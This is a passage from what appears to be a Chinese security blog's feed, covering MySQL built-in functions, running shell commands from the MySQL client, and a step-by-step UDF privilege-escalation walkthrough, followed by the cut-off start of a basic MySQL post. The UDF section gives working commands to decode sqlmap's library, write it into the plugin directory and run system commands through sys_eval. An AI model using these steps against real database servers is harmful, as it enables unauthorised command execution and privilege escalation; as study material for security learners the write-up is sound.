class="line">SELECT BIN(10);</span><br><span class="line">+---------+</span><br><span class="line">| BIN(10) |</span><br><span class="line">+---------+</span><br><span class="line">| 1010    |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.BINARY(s)</strong></p><p> 将字符串 s 转换为二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT BINARY &#39;MySQL&#39;;</span><br><span class="line">+--------------------------------+</span><br><span class="line">| BINARY &#39;MySQL&#39;                 |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 0x4D7953514C                   |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p><strong>3.条件判断函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">    WHEN condition1 THEN result1</span><br><span class="line">    WHEN condition2 THEN result2</span><br><span class="line">   ...</span><br><span class="line">    WHEN conditionN THEN resultN</span><br><span class="line">    ELSE result</span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE </span><br><span class="line">    -&gt; WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">    -&gt; WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">    -&gt; ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">    -&gt; END;</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| CASE </span><br><span class="line">WHEN &#39;1 &gt; 0&#39; THEN &#39;1 &gt; 0&#39;</span><br><span class="line">WHEN &#39;2 &gt; 0&#39; THEN &#39;2 &gt; 0&#39;</span><br><span class="line">ELSE &#39;3 &gt; 0&#39;</span><br><span class="line">END |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| 1 &gt; 0                                                                      |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>4.CAST(x AS type)</strong></p><p>转换数据类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CAST(&quot;2020-11-11&quot; AS DATE);</span><br><span class="line">+----------------------------+</span><br><span class="line">| CAST(&quot;2020-11-11&quot; AS DATE) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| 2020-11-11                 |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.COALESCE(expr1, expr2, …., expr_n)</strong></p><p>返回参数中的第一个非空表达式（从左向右）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL);</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| COALESCE(NULL,NULL,&#39;MySQL&#39;,NULL,&#39;Oracle&#39;,NULL) |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| MySQL                                          |</span><br><span class="line">+------------------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.CONNECTION_ID()</strong></p><p>返回唯一的连接 ID</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONNECTION_ID();</span><br><span class="line">+-----------------+</span><br><span class="line">| CONNECTION_ID() |</span><br><span class="line">+-----------------+</span><br><span class="line">|              11 |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>7.CONV(x,f1,f2)</strong></p><p> 返回 f1 进制数变成 f2 进制数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CONV(10,10,2);</span><br><span class="line">+---------------+</span><br><span class="line">| CONV(10,10,2) |</span><br><span class="line">+---------------+</span><br><span class="line">| 1010          |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>8.CONVERT(s USING cs)</strong></p><p>函数将字符串 s 的字符集变成 cs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHARSET(&#39;ABC&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| CHARSET(&#39;ABC&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| utf8mb4        |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT CHARSET(CONVERT(&#39;ABC&#39; USING gbk));</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| CHARSET(CONVERT(&#39;ABC&#39; USING gbk)) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| gbk                               |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>9.USER()  |CURRENT_USER()  |SESSION_USER()  |SYSTEM_USER()</strong></p><p>返回当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CURRENT_USER();</span><br><span class="line">+----------------+</span><br><span class="line">| CURRENT_USER() |</span><br><span class="line">+----------------+</span><br><span class="line">| root@%         |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.DATABASE()</strong></p><p>返回当前数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DATABASE();</span><br><span class="line">+------------+</span><br><span class="line">| DATABASE() |</span><br><span class="line">+------------+</span><br><span class="line">| mysql      |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>11.IF(expr,v1,v2)</strong></p><p>如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(1 &gt; 0,&#39;正确&#39;,&#39;错误&#39;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| IF(1 &gt; 0,&#39;正确&#39;,&#39;错误&#39;)     |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 正确                        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p><strong>12.IFNULL(v1,v2)</strong></p><p>如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT IFNULL(null,&#39;Hello Word&#39;);</span><br><span class="line">+---------------------------+</span><br><span class="line">| IFNULL(null,&#39;Hello Word&#39;) |</span><br><span class="line">+---------------------------+</span><br><span class="line">| Hello Word                |</span><br><span class="line">+---------------------------+</span><br></pre></td></tr></table></figure><p><strong>13.ISNULL(expression)</strong></p><p>判断表达式是否为 NULL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT ISNULL(NULL);</span><br><span class="line">+--------------+</span><br><span class="line">| ISNULL(NULL) |</span><br><span class="line">+--------------+</span><br><span class="line">|            1 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>14.LAST_INSERT_ID()</strong></p><p>返回最近生成的 AUTO_INCREMENT 值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LAST_INSERT_ID();</span><br><span class="line">+------------------+</span><br><span class="line">| LAST_INSERT_ID() |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>15.NULLIF(expr1, expr2)</strong></p><p>比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT NULLIF(25, 25);</span><br><span class="line">+----------------+</span><br><span class="line">| NULLIF(25, 25) |</span><br><span class="line">+----------------+</span><br><span class="line">|           NULL |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>16.VERSION()</strong></p><p>查看MySQL版本</p><p>返回数据库的版本号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> SELECT VERSION();</span><br><span class="line">+-------------------------+</span><br><span class="line">| VERSION()               |</span><br><span class="line">+-------------------------+</span><br><span class="line">| 8.0.22-0ubuntu0.20.04.2 |</span><br><span class="line">+-------------------------+</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>17.MD5()</strong></p><p>加密函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MD5(&#39;123456&#39;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| MD5(&#39;123456&#39;)                    |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p><strong>18.IP地址与数字相互转换的函数</strong></p><ul><li>INET_ATON(IP)</li></ul><p>IP地址转换为数字表示</p><ul><li>INET_NTOA(n)</li></ul><p>将数字n转换成IP形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT INET_ATON(&#39;192.168.0.1&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| INET_ATON(&#39;192.168.0.1&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|               3232235521 |</span><br><span class="line">+--------------------------+</span><br><span class="line">SELECT INET_NTOA(3232235521);</span><br><span class="line">+-----------------------+</span><br><span class="line">| INET_NTOA(3232235521) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 192.168.0.1           |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>19.加锁函数和解锁函数</strong></p><ul><li>GET_LOCK(name,time)函数定义一个名称为name、持续时间长度为time秒的锁。如果锁定成功，则返回1；如果尝试超时，则返回0；如果遇到错误，返回NULL。</li><li>RELEASE_LOCK(name)函数解除名称为name的锁。如果解锁成功，则返回1；如果尝试超时，返回0；如果解锁失败，返回NULL；</li><li>IS_FREE_LOCK(name)函数判断是否已使用名为name的锁定。如果使用，返回0，否则，返回1；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SELECT GET_LOCK(&#39;MySQL&#39;,10);</span><br><span class="line">+----------------------+</span><br><span class="line">| GET_LOCK(&#39;MySQL&#39;,10) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    1 |</span><br><span class="line">+----------------------+</span><br><span class="line">SELECT IS_FREE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| IS_FREE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     0 |</span><br><span class="line">+-----------------------+</span><br><span class="line">SELECT RELEASE_LOCK(&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RELEASE_LOCK(&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     1 |</span><br><span class="line">+-----------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>20.@@datadir</strong>                                       数据库路径</p><p>​      <strong>@@version_compile_os</strong>               操作系统版本</p><p><strong>21.sleep(N)</strong></p><p>执行select sleep(N)可以让此语句运行N秒钟</p><p>前提条件: 指定条件的记录存在时才会停止指定的秒数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(1),database(),version(),user();</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">| sleep(1) | database() | version()               | user()         |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">|        0 | test       | 8.0.22-0ubuntu0.20.04.2 | root@localhost |</span><br><span class="line">+----------+------------+-------------------------+----------------+</span><br><span class="line">1 row in set (1.00 sec)</span><br></pre></td></tr></table></figure><h1 id="MySQL-执行系统命令"><a href="#MySQL-执行系统命令" class="headerlink" title="MySQL 执行系统命令"></a>MySQL 执行系统命令</h1><p>在 MySQL 的命令行界面中可以使用 <code>system shell-cmd</code> 或者<code>\! shell-cmd</code> 格式执行 shell 命令。</p><p><strong>实例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; system ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br><span class="line">mysql&gt; \! ls &#x2F;var&#x2F;www</span><br><span class="line">example.com  html</span><br></pre></td></tr></table></figure><p>也可以打开一个新的 shell，关闭 shell (使用 exit 或者 CTRL D)后返回 MySQL 命令行界面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; \! bash</span><br><span class="line">root@linux:&#x2F;var&#x2F;www&#x2F;html&#x2F;project# cd ~</span><br><span class="line">root@linux:~# ls</span><br><span class="line">snap</span><br><span class="line">root@linux:~# exit</span><br><span class="line">exit</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h1 id="UDF提权执行系统命令"><a href="#UDF提权执行系统命令" class="headerlink" title="UDF提权执行系统命令"></a>UDF提权执行系统命令</h1><blockquote><p>UDF 为 “User-Defined Function” 的所写，即用户自定义函数。MySQL 允许用户添加新的函数，其中一种方法就是通过其提供的 UDF 接口，添加用户自定义函数。用户自定义函数可以使用 C/C++ 语言编写并编译成库文件（其它语言也可以，只要能编译成共享库文件），放到 MySQL 指定的目录下，以便 MySQL 能动态加载用户自定义的函数。</p><p>使用 UDF 可以加载自定义的函数，因此可以通过自定义函数执行各种操作，关于用户自定义函数的编写可参考，<a href="https://docstore.mik.ua/orelly/weblinux2/mysql/ch14_01.htm">Extending MySQL</a></p></blockquote><h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p><strong>1）原理</strong>：UDF提权是利用MySQL的自定义函数功能，构造特定的DLL将Mysql账号转化为系统system权限</p><p><strong>2）条件</strong></p><ul><li>MySQL 用户能写文件到 MySQL 指定的自定义函数库存放目录。</li><li>MySQL 用户具有 <code>INSERT</code> 权限，才能使用 <code>CREATE FUNCTION</code>语句在 MySQL 中添加自定义的函数，此外如果使用 <code>DROP FUNCTION</code> 语句删除自定义函数，还需要有 <code>DELETE</code> 权限。</li></ul><p>查看<code>secure_file_priv</code>的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br><span class="line">当secure_file_priv的值为NULL或&#x2F;tmp&#x2F;时，此时无法提权</span><br><span class="line">当secure_file_priv的值没有具体值时，则可以提权</span><br></pre></td></tr></table></figure><h2 id="udf文件"><a href="#udf文件" class="headerlink" title="udf文件"></a>udf文件</h2><p>对于udf文件，在sqlmap工具中自带就有，或<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">github</a>里搜索，只要找对应操作系统的版本即可</p><p>查看系统架构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%compile%&#39;;         查看主机版本及架构</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173019139.png" alt="image-20201125173019139"></p><p>Windows下是.dll文件；linux下是.so文件</p><p>在 sqlmap\data\udf\mysql\windows|linux\64|32目录下存放着lib_mysqludf_sys.dll__|.so_</p><p>但是sqlmap 中 自带 的shell 以及一些二进制文件，为了防止被误杀都经过异或方式编码，不能直接使用,可以利用sqlmap 自带的解码工具cloak.py解码后，再直接利用。</p><p>进入到 sqlmap\extra\cloak 目录下，执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python clock.py -d -i &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure><p>然后会生成一个lib_mysqludf_sys.so文件</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125173442662.png" alt="image-20201125173442662"></p><h2 id="使用udf"><a href="#使用udf" class="headerlink" title="使用udf"></a>使用udf</h2><p><strong>1)将udf文件放到指定位置</strong></p><p>得到插件库路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201125180437269.png" alt="image-20201125180437269"></p><p>得到udf文件的十六进制格式，可在本地通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so&#39;)) into outfile &#39;&#x2F;tmp&#x2F;udf.txt&#39;;</span><br></pre></td></tr></table></figure><p>#windows下cmd命令行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -encodehex -f -v lib_mysqludf_sys.dll 1.txt 4</span><br></pre></td></tr></table></figure><p>写入插件库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;7F454C46020...&#39; into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so&#39;;</span><br></pre></td></tr></table></figure><p><strong>2)从udf文件中引入自定义函数</strong></p><p>查看下这个udf库所支持的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@linux:~# nm -D &#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so</span><br><span class="line">         w _Jv_RegisterClasses</span><br><span class="line">0000000000201788 A __bss_start</span><br><span class="line">         w __cxa_finalize</span><br><span class="line">         w __gmon_start__</span><br><span class="line">0000000000201788 A _edata</span><br><span class="line">0000000000201798 A _end</span><br><span class="line">0000000000001178 T _fini</span><br><span class="line">0000000000000ba0 T _init</span><br><span class="line">         U fgets</span><br><span class="line">         U fork</span><br><span class="line">         U free</span><br><span class="line">         U getenv</span><br><span class="line">000000000000101a T lib_mysqludf_sys_info</span><br><span class="line">0000000000000da4 T lib_mysqludf_sys_info_deinit</span><br><span class="line">0000000000001047 T lib_mysqludf_sys_info_init</span><br><span class="line">         U malloc</span><br><span class="line">         U mmap</span><br><span class="line">         U pclose</span><br><span class="line">         U popen</span><br><span class="line">         U realloc</span><br><span class="line">         U setenv</span><br><span class="line">         U strcpy</span><br><span class="line">         U strncpy</span><br><span class="line">0000000000000dac T sys_bineval</span><br><span class="line">0000000000000dab T sys_bineval_deinit</span><br><span class="line">0000000000000da8 T sys_bineval_init</span><br><span class="line">0000000000000e46 T sys_eval</span><br><span class="line">0000000000000da7 T sys_eval_deinit</span><br><span class="line">0000000000000f2e T sys_eval_init</span><br><span class="line">0000000000001066 T sys_exec</span><br><span class="line">0000000000000da6 T sys_exec_deinit</span><br><span class="line">0000000000000f57 T sys_exec_init</span><br><span class="line">00000000000010f7 T sys_get</span><br><span class="line">0000000000000da5 T sys_get_deinit</span><br><span class="line">0000000000000fea T sys_get_init</span><br><span class="line">000000000000107a T sys_set</span><br><span class="line">00000000000010e8 T sys_set_deinit</span><br><span class="line">0000000000000f80 T sys_set_init</span><br><span class="line">         U sysconf</span><br><span class="line">         U system</span><br><span class="line">         U waitpid</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function sys_eval returns string soname &quot;lib_mysqludf_sys.so&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br></pre></td></tr></table></figure><p><strong>3)执行自定义函数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sys_eval(&#39;whoami&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| sys_eval(&#39;whoami&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql       |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.04 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| name   | ret | dl     | type   |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">| sys_eval |  0 | lib_mysqludf_sys.so | function |</span><br><span class="line">+----------+-----+-------------+----------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; drop function sys_eval;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from func;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/hellokandy/article/details/82964077">MySQL 常用内置函数与所有内置函数</a></p><p>[2] <a href="https://blog.csdn.net/qq_34845394/article/details/90077070">MySQL常用内置函数</a></p><p>[3] <a href="https://www.cnblogs.com/litlife/p/9030673.html">udf提权原理详解</a></p><p>[4] <a href="https://www.jb51.net/article/51767.htm">Linux利用UDF库实现Mysql提权</a></p><p>[5] <a href="https://blog.csdn.net/qq_36119192/article/details/84863268?utm_medium=distribute.pc_relevant.none-task-blog-baidulandingword-2&spm=1001.2101.3001.4242">MySQL UDF提权执行系统命令</a></p><p>[6] <a href="https://blog.csdn.net/Zlirving_/article/details/106423442?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1.control">Mysql——udf提权</a></p><p>[7] <a href="https://bingslient.github.io/2019/10/31/MySQL%20%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8">MySQL 函数及其利用</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL基础操作学习</title>
      <link href="posts/8774.html"/>
      <url>posts/8774.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>认识数据库</p><ul><li>数据库 : 用来存储海量数据的仓库 。</li><li>SQL ：用于访问和处理数据库的计算机语言。</li></ul><p>分类：</p><ul><li>关系型数据库（二维表格形式）：Oracle,MySQL,MariaDB,SQL Server…</li><li>非关系型数据库（not only sql）: Memcached,redis,MongoDB…</li></ul></blockquote><h1 id="MySQL基础操作"><a href="#MySQL基础操作" class="headerlink" title="MySQL基础操作"></a>MySQL基础操作</h1><p>安装mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>登录mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/zXqlJhGSIiWtvbD.png" alt="image-20201109225823132"></p><p>退出mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\q </span><br></pre></td></tr></table></figure><p>当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT USER();</span><br></pre></td></tr></table></figure><p>当前日期时间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT NOW();</span><br></pre></td></tr></table></figure><p>当前版本信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT VERSION();</span><br></pre></td></tr></table></figure><p>服务器状态</p><figure 